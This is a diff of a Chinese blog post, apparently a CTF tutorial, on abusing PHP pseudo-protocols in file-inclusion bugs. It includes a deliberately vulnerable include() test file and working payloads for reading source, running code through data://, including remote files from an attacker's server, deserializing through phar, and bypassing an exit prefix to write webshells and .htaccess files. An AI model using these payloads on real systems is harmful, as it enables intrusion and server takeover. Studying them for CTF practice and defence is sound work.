@@ -214,10 +214,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2020-12-22 00:00:00 / 修改时间：23:57:15" itemprop="dateCreated datePublished" datetime="2020-12-22T00:00:00+08:00">2020-12-22</time>
+              <time title="创建时间：2020-12-22 00:00:00" itemprop="dateCreated datePublished" datetime="2020-12-22T00:00:00+08:00">2020-12-22</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-02-05 21:20:32" itemprop="dateModified" datetime="2021-02-05T21:20:32+08:00">2021-02-05</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -253,15 +259,371 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>文章首发i春秋：<a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-59593-1-1.html">传送门</a>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2020/12/22/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%9C%A8CTF%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8%E5%B0%8F%E7%BB%93/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
+          <a id="more"></a>
+
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>文章首发i春秋：<a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-59593-1-1.html">传送门</a></p>
+<p>php的伪协议在CTF中算是一个比较老的知识点，也有一些新的利用点，在最近的CTF比赛中比如极客大挑战2020，WMCTF2020中的题目也还会出现，于是本篇文章就把CTF中涉及到这个知识点的地方从浅到深做一个复习和总结</p>
+<blockquote>
+<p>关于php中的伪协议可以参考官方文档：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php">https://www.php.net/manual/zh/wrappers.php</a></p>
+</blockquote>
+<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201213120241652.png" alt="image-20201213120241652"></p>
+<h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p><code>php.ini</code>的配置</p>
+<p><code>allow_url_fopen: on</code>  默认开启，该选项为on便是激活了URL形式的fopen封装协议使得可以访问URL对象文件等</p>
+<p><code>allow_url_include: off</code>  默认关闭，该选项为on便是允许包含URL对象文件等</p>
+<p>我这里在本地测试两个选项都处于<code>on</code>的状态</p>
+<h2 id="php伪协议与文件包含"><a href="#php伪协议与文件包含" class="headerlink" title="php伪协议与文件包含"></a>php伪协议与文件包含</h2><p>首先提到伪协议就不得不说到<code>File Inclusion</code>(文件包含漏洞)，文件包含漏洞在php中通常出现在<code>include()/require()/include_once()/require_once()</code>这四个函数中，这四个函数的本意是如果我们像如下去包含<code>func.php</code>文件的话，就会调用<code>func.php</code>里面的内容和功能</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;func.php&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>所以如果其中的变量能够被用户操控，去包含了一些含有恶意代码的文件，则可能导致文件包含漏洞，最终导致任意代码执行或者任意文件读取，而且文件内容中有php代码的话，PHP的内核并不会在意被包含的文件是什么类型，也就是说不管你是什么后缀的文件，一律全部被解析</p>
+<p>除了上面四个函数之外，也有其他函数能够读取文件的，比如说</p>
+<ul>
+<li><code>highlight_file()</code>如同函数名一样用于高亮文件</li>
+<li><code>show_source()</code>函数作用和<code>highlight_file()</code>基本一样</li>
+<li><code>file_get_contents</code> 函数把整个文件读入一个字符串中</li>
+<li><code>file</code>函数把整个文件读入一个数组中</li>
+<li><code>readfile</code>该函数读入一个文件并写入到输出缓冲，若成功，则返回从文件中读入的字节数，若失败，则返回 false</li>
+<li><code>fopen</code>函数打开一个文件或 URL</li>
+</ul>
+<p>这里要注意的是这些函数使用伪协议的时候是不能够解析php代码，甚至除了<code>highlight_file()</code>和<code>show_source()</code>之外，其他的都不能直接读取到php的代码（有些配合伪协议以base64的形式可以读），但是如果能够读取敏感文件带来的后果也是比较严重的</p>
+<p>然后文件包含又分为两种情况</p>
+<ul>
+<li>本地文件包含漏洞（Local File Inclusion LFI）</li>
+</ul>
+<p>仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息，很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力</p>
+<ul>
+<li>远程文件包含漏洞（RFI）</li>
+</ul>
+<p>能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码</p>
+<p>这里写一个<code>include</code>为伪协议基础用法测试文件包含，然后下面就逐个协议来看</p>
+<p><code>test.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">&#x27;file&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="file"><a href="#file" class="headerlink" title="file://"></a><code>file://</code></h3><p><code>file://</code>协议通常用来读取文件，可用于文件包含中</p>
+<p>使用条件</p>
+<p><code>allow_url_fopen: off/on</code></p>
+<p><code>allow_url_include: off/on</code></p>
+<p>格式：<code>file://[绝对路径+文件名]</code></p>
+<p>这里把<code>&lt;?php phpinfo();?&gt;</code>写进去文件名为<code>phpinfo</code>，重命名为<code>phpinfo.jpg</code></p>
+<p>payload如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;file:&#x2F;&#x2F;&#x2F;D:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;phpinfo.jpg</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201213122437273.png" alt="image-20201213122437273"></p>
+<h3 id="php"><a href="#php" class="headerlink" title="php://"></a><code>php://</code></h3><p><code>php://</code> 用于访问各个输入/输出流(I/O streams)，CTF中通常使用到的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>常用于读取源码，<code>php://input</code>常用于执行php代码</p>
+<ul>
+<li><code>php://filter</code></li>
+</ul>
+<p>使用条件</p>
+<p><code>allow_url_fopen: off/on</code></p>
+<p><code>allow_url_include: off/on</code></p>
+<p>可以读取源代码并进行base64编码输出，payload如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
+
+<p>在CTF中，我们通常会用这种方式去读取文件的一个源代码</p>
+<ul>
+<li><code>php://input</code></li>
+</ul>
+<p>使用条件</p>
+<p><code>allow_url_fopen: off/on</code></p>
+<p><code>allow_url_include: on</code></p>
+<p>可以读取<code>phpinfo</code>或者有写入权限的话可以写入一句话木马，但是这里要注意的是注：当<code>enctype=&quot;multipart/form-data&quot;</code>时，<code>php://input</code>是无效的</p>
+<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201222232434075.png" alt="image-20201222232434075"></p>
+<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201213103630764.png"></p>
+<p>这里要注意的有时候我们会用<code>file_get_contents</code>函数来使用<code>php://input</code>来将文件的内容读入到一个字符串</p>
+<h3 id="data"><a href="#data" class="headerlink" title="data://"></a><code>data://</code></h3><p>自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据，在CTF中通常可以用来执行PHP代码，然后要注意的一点是，经过测试<code>data://</code>协议是是受限于<code>allow_url_fopen</code>的，官方文档上给出的是no，实际应该改为yes</p>
+<p>使用条件</p>
+<p><code>allow_url_fopen: on</code></p>
+<p><code>allow_url_include: on</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p><code>data://</code>协议可以不加<code>//</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;data:text&#x2F;plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">?file&#x3D;data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br></pre></td></tr></table></figure>
+
+<h3 id="http-amp-https"><a href="#http-amp-https" class="headerlink" title="http://&amp;https://"></a><code>http://</code>&amp;<code>https://</code></h3><p>这个大家应该都认识，常规URL形式，通过<code>HTTP 1.0</code>的GET方法，以只读访问文件或资源</p>
+<p>使用条件</p>
+<p><code>allow_url_fopen: on</code></p>
+<p><code>allow_url_include: on</code></p>
+<p>这里主要用于远程文件包含，需要在vps上放置我们的<code>phpinfo.jpg</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;http:&#x2F;&#x2F;ip&#x2F;phpinfo.jpg</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201220121524983.png" alt="image-20201220121524983"></p>
+<p>如果要生成一个木马的话<code>phpinfo.jpg</code>可以这样写</p>
+<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201222232156612.png" alt="image-20201222232156612"></p>
+<p>包含完之后就可以发现多了一个<code>shell.php</code>的一句话木马</p>
+<h3 id="zip-amp-bzip2-amp-zlib"><a href="#zip-amp-bzip2-amp-zlib" class="headerlink" title="zip://&amp;bzip2://&amp;zlib://"></a><code>zip://</code>&amp;<code>bzip2://</code>&amp;<code>zlib://</code></h3><p><code>zip://</code>，<code>bzip2://</code>，<code>zlib://</code>这三种均属于压缩流，可以访问压缩文件中的子文件，并且最强大的是他们是不需要指定后缀名，可修改为任意后缀，也就是说如果有文件包含+文件上传漏洞，通过这种方法，我们就可以符合上传的白名单，从而进行getshell</p>
+<p>使用条件</p>
+<p><code>allow_url_fopen: off/on</code></p>
+<p><code>allow_url_include: off/on</code></p>
+<ul>
+<li><code>zip://</code></li>
+</ul>
+<p>格式：<code>zip://[绝对或相对路径+上传文件]%23[解压文件]</code></p>
+<p>这里把<code>&lt;?php phpinfo();?&gt;</code>写进去文件名为<code>phpinfo</code>，这个就是上面的解压文件，不过这里不一定要用我这个，也可以使用任意后缀，比如<code>phpinfo.txt</code>，<code>phpinfo.jpg</code>，因为文件包含可以解析他们</p>
+<p>再把<code>phpinfo</code>压缩为zip的格式<code>phpinfo.zip</code>，可以重命名为<code>phpinfo.jpg</code>，因为这里可以修改任意后缀名，再把<code>phpinfo.jpg</code>上传到服务器，就可以配合文件包含漏洞了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;zip:&#x2F;&#x2F;D:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;phpinfo.jpg%23phpinfo</span><br><span class="line">?file&#x3D;zip:&#x2F;&#x2F;.&#x2F;phpinfo.jpg%23phpinfo</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201212104126753.png"></p>
+<ul>
+<li><code>bzip2://</code></li>
+</ul>
+<p>格式：<code>compress.bzip2://[绝对或相对路径+上传文件]/[解压文件]</code></p>
+<p>把<code>phpinfo</code>文件压缩为bzip2的格式<code>phpinfo.bz2</code>，可以重命名为<code>phpinfo.jpg</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;compress.bzip2:&#x2F;&#x2F;.&#x2F;phpinfo.jpg</span><br><span class="line">?file&#x3D;compress.bzip2:&#x2F;&#x2F;D:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;phpinfo.jpg</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201212104226413.png"></p>
+<ul>
+<li><code>zlib://</code></li>
+</ul>
+<p>格式：<code>compress.zlib://[绝对或相对路径+上传文件]/[解压文件]</code></p>
+<p>把<code>phpinfo</code>文件压缩为gzip的格式<code>phpinfo.gz</code>，可以重命名为<code>phpinfo.jpg</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;compress.zlib:&#x2F;&#x2F;.&#x2F;phpinfo.jpg</span><br><span class="line">?file&#x3D;compress.zlib:&#x2F;&#x2F;D:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;phpinfo.jpg</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201212105624824.png"></p>
+<h3 id="phar"><a href="#phar" class="headerlink" title="phar://"></a><code>phar://</code></h3><p><code>phar://</code>协议与<code>zip://</code>类似，同样可以访问zip格式压缩包内容，要注意的是bzip2和gzip格式的都不行</p>
+<p>格式：<code>phar://[绝对或相对路径+上传文件]/[解压文件]</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;phar:&#x2F;&#x2F;.&#x2F;phpinfo.jpg&#x2F;phpinfo</span><br><span class="line">?file&#x3D;phar:&#x2F;&#x2F;D:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;phpinfo.jpg&#x2F;phpinfo</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201213125825091.png" alt="image-20201213125825091"></p>
+<h2 id="php伪协议进阶用法"><a href="#php伪协议进阶用法" class="headerlink" title="php伪协议进阶用法"></a>php伪协议进阶用法</h2><h3 id="phar-1"><a href="#phar-1" class="headerlink" title="phar://"></a><code>phar://</code></h3><p>除了上面的用法之外，<code>phar://</code>协议在CTF中还常用于反序列化，在<code>php&gt;=5.3</code>的时候，默认开启支持phar，文件状态问为只读，而且使用phar文件不需要任何配置，php使用<code>phar://</code>伪协议来解析phar文件的内容</p>
+<p>漏洞产生的原因</p>
+<p>使用<code>Phar://</code>伪协议去读取Phar文件时候，文件会被当做phar对象，meta-data部分会被反序列化。phar文件会以序列化的形式存储用户自定义的meta-data这一特性，拓展了php反序列化漏洞的攻击面，该方法在文件系统函数参数可控的情况下，配合<code>phar://</code>伪协议，可以不依赖<code>unserialize()</code>直接进行反序列化操作</p>
+<p>这里贴一下受影响的文件系统函数列表</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711232201316.png"></p>
+<p>举一个小栗子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的话需要把<code>php.ini</code>的<code>;phar.readonly = On</code>改为<code>phar.readonly = Off</code>，否则无法生成<code>phar</code>文件</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711232430900.png"></p>
+<p>可以看到已经成功输出字符，当文件系统函数的参数可控时，我们可以在不调用<code>unserialize()</code>的情况下进行反序列化操作，极大的拓展了攻击面</p>
+<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a><code>php://filter</code></h3><p><code>php://filter</code>在伪协议中利用起来的话算一个难点，所以这里会写的比较详细，首先<code>php://filter</code>是一种元封装器，用于数据流打开时筛选过滤应用，其中<code>read</code>和<code>write</code>参数有不同的应用场景，<code>read</code>用于<code>include()</code>和<code>file_get_contents()</code>，<code>write</code>用于<code>file_put_contents()</code>中，下面是一些参数的说明</p>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>resource=&lt;要过滤的数据流&gt;</td>
+<td>这个参数是必须的。它指定了你要筛选过滤的数据流</td>
+</tr>
+<tr>
+<td>read=&lt;读链的筛选列表&gt;</td>
+<td>该参数可选。可以设定一个或多个过滤器名称，以管道符分隔</td>
+</tr>
+<tr>
+<td>write=&lt;写链的筛选列表&gt;</td>
+<td>该参数可选。可以设定一个或多个过滤器名称，以管道符分隔</td>
+</tr>
+<tr>
+<td>&lt;两个链的筛选列表&gt;</td>
+<td>任何没有以 read= 或 write= 作前缀的筛选器列表会视情况应用于读或写链</td>
+</tr>
+</tbody></table>
+<h4 id="常用过滤器"><a href="#常用过滤器" class="headerlink" title="常用过滤器"></a>常用过滤器</h4><p>然后这里简单介绍一些常用的过滤器</p>
+<blockquote>
+<p>官方文档：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filters.php">https://www.php.net/manual/zh/filters.php</a></p>
+</blockquote>
+<ul>
+<li>转换过滤器</li>
+</ul>
+<p>1.<code>base64</code></p>
+<p><code>convert.base64-encode</code>和 <code>convert.base64-decode</code>使用这两个过滤器等同于分别用 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.base64-encode.php">base64_encode()</a>和<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.base64-decode.php">base64_decode()</a>函数处理所有的流数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
+
+<p>这种方法是最常用的，读取之后base64解码即可</p>
+<p>2.<code>quoted-printable</code></p>
+<p><code>convert.quoted-printable-encode</code>和 <code>convert.quoted-printable-decode</code>使用此过滤器的 decode 版本等同于用<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.quoted-printable-decode.php">quoted_printable_decode()</a>函数处理所有的流数据。</p>
+<p>这里要注意的是，如果直接用下面的语句去网页读，会出现乱码或者直接不显示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
+
+<p>所以我们需要利用类似如下脚本读取之后解码才行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$content = file_get_contents(<span class="string">&quot;http://127.0.0.1/test.php?file=php://filter/read=convert.quoted-printable-encode/resource=flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> quoted_printable_decode($content);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201213141355451.png" alt="image-20201213141355451"></p>
+<ul>
+<li>字符串过滤器</li>
+</ul>
+<p>1.<code>string.rot13</code></p>
+<p><code>string.rot13</code>（自 PHP 4.3.0 起）使用此过滤器等同于用 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.str-rot13.php">str_rot13()</a>函数处理所有的流数据</p>
+<p>2.<code>string.strip_tags</code></p>
+<blockquote>
+<p><strong>警告</strong>：本特性已自 PHP 7.3.0 起废弃。强烈建议不要使用本特性。</p>
+</blockquote>
+<p><code>string.strip_tags</code>（自PHP 5.0.0起）使用此过滤器等同于用<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filters.string.strip_tags.php">strip_tags()</a>函数处理所有的流数据。</p>
+<p>3.<code>string.toupper</code>（自 PHP 5.0.0 起）使用此过滤器等同于用 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.strtoupper.php">strtoupper()</a>函数处理所有的流数据。也就是变大写。</p>
+<p>4.<code>string.tolower</code>（自 PHP 5.0.0 起）使用此过滤器等同于用 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.strtolower.php">strtolower()</a>函数处理所有的流数据。也就是变小写。</p>
+<ul>
+<li>压缩过滤器</li>
+</ul>
+<p><code>zlib.deflate</code>（压缩）和 <code>zlib.inflate</code>（解压）实现了定义与 <a target="_blank" rel="noopener" href="http://www.faqs.org/rfcs/rfc1951">» RFC 1951</a>的压缩算法。 <code>deflate</code>过滤器可以接受以一个关联数组传递的最多三个参数。</p>
+<p><code>bzip2.compress</code>和 <code>bzip2.decompress</code>工作的方式与上面讲的 zlib 过滤器相同。</p>
+<p>这些过滤器在下面的绕过死亡exit都会详细说明</p>
+<h4 id="绕过死亡exit"><a href="#绕过死亡exit" class="headerlink" title="绕过死亡exit"></a>绕过死亡exit</h4><p>这个点是P神在2016年提出来的，但在最近的CTF又频频出现了这个考点，考的就是在<code>file_put_content</code>函数输入的内容前面拼接了一个<code>&lt;?php exit; ?&gt;</code>，所以导致我们写入的php文件无法执行，这里就探讨如何去绕过这个死亡exit，然后不同的题目<code>file_put_content</code>的写法略微有不同的地方，大概有下面两种</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents($filename,&quot;&lt;?php exit(); ?&gt;&quot;.$content);</span><br><span class="line">file_put_contents($content,&quot;&lt;?php exit(); ?&gt;&quot;.$content);</span><br></pre></td></tr></table></figure>
+
+<h5 id="第一种情况"><a href="#第一种情况" class="headerlink" title="第一种情况"></a>第一种情况</h5><p>这里我们测试代码如下</p>
+<p><code>test2.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">file_put_contents($_GET[<span class="string">&#x27;filename&#x27;</span>],<span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>.$_GET[<span class="string">&#x27;content&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<h6 id="单独过滤器"><a href="#单独过滤器" class="headerlink" title="单独过滤器"></a>单独过滤器</h6><ul>
+<li>使用<code>convert.base64-decode</code>绕过</li>
+</ul>
+<p>首先base64编码是基于64个字符<code>A-Z</code>，<code>a-z</code>，<code>0-9</code>，<code>+</code>，<code>/</code>的编码方式，当php在解码base64时，遇到不在其中的字符，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码，而我们上面的<code>&lt;?php exit; ?&gt;</code>中的<code>&lt;?;&gt;</code>以及其中的空格都会被忽略，也就是说只有<code>phpexit</code>和我们传入的其他字符将会被解码，而base64算法解码时是4个byte一组，我们在传入的恶意代码前随便加上64个字符的其中一个，把<code>phpexit</code>凑够8个字符，这里为<code>phpexita</code>，这样的话就可以成功去除这个死亡exit</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content&#x3D;aPD9waHAgcGhwaW5mbygpOyA&#x2F;Pg&#x3D;&#x3D;&amp;filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;shell.php</span><br></pre></td></tr></table></figure>
+
+<p>可以看到我们最终写入的内容，已经没有死亡exit了，<code>phpinfo</code>也已经成功写入</p>
+<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201213152431487.png" alt="image-20201213152431487"></p>
+<ul>
+<li><code>string.rot13</code>编码绕过</li>
+</ul>
+<p>原理也和上面的差不多，<code>&lt;?php exit; ?&gt;</code>在经过rot13编码后会变成<code>&lt;?cuc rkvg; ?&gt;</code>，在不开启短标签的情况下，死亡exit就不会执行了</p>
+<p>我们可以先将<code>phpinfo</code>进行一个rot13的编码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> str_rot13(<span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>);</span><br><span class="line"><span class="comment">//<span class="meta">&lt;?</span>cuc cucvasb();<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>payload如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content&#x3D;&lt;?cuc cucvasb();?&gt;&amp;filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13&#x2F;resource&#x3D;shell.php</span><br></pre></td></tr></table></figure>
+
+<p>最终写进shell.php里面代码如下</p>
+<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201213160158823.png" alt="image-20201213160158823"></p>
+<ul>
+<li>使用<code>.htaccess</code>文件包含</li>
+</ul>
+<p>这个点在我之前的文章<a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&tid=58841&fromuid=434051">CTF中.htaccess文件的利用</a>已经提到过了，这里再说一下，第一个<code>php://filter</code>将<code>flag.php</code>文件进行base64编码，第二个<code>php://filter</code>使用<code>string.strip_tags</code>去除死亡exit，然后<code>auto_prepend_file</code>再把<code>flag.php</code>文件包含到所有的php页面当中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content&#x3D;php_value%20auto_prepend_file%20&quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;&amp;filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.strip_tags&#x2F;resource&#x3D;.htaccess</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201213191355762.png" alt="image-20201213191355762"></p>
+<h6 id="组合过滤器"><a href="#组合过滤器" class="headerlink" title="组合过滤器"></a>组合过滤器</h6><ul>
+<li>利用<code>string.strip_tags</code>+<code>convert.base64-decode</code>组合绕过</li>
+</ul>
+<p>但是这种方法具有一定的局限性，原因就是<code>string.strip_tags</code>在php7会发生段错误，所以在php7的版本无法使用本方法</p>
+<p><code>strip_tags</code>函数的作用是剥去字符串中的 HTML、XML 以及 PHP 的标签，我们很容易可以想到利用他来去除死亡exit，但我们如果像下面这样写的话</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content&#x3D;&lt;?php phpinfo();?&gt;&amp;filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.strip_tags&#x2F;resource&#x3D;shell.php</span><br></pre></td></tr></table></figure>
+
+<p>就会连同<code>&lt;?php phpinfo();?&gt;</code>一起去除了，但是<code>php://filter</code>这个伪协议是支持使用多个过滤器的，所以我们这里可以先将恶意代码用base64编码，在调用<code>strip_tags</code>后再进行base64解码。死亡exit在第一步被去除，而我们的恶意代码将在第二步被还原，这里要注意的是过滤器之间用<code>|</code>分隔</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content&#x3D;PD9waHAgcGhwaW5mbygpOyA&#x2F;Pg&#x3D;&#x3D;&amp;filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.strip_tags|convert.base64-decode&#x2F;resource&#x3D;shell.php</span><br></pre></td></tr></table></figure>
+
+<p>可以看到我们最后写进shell.php里面的就是一个很干净的phpinfo</p>
+<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201213154748202.png" alt="image-20201213154748202"></p>
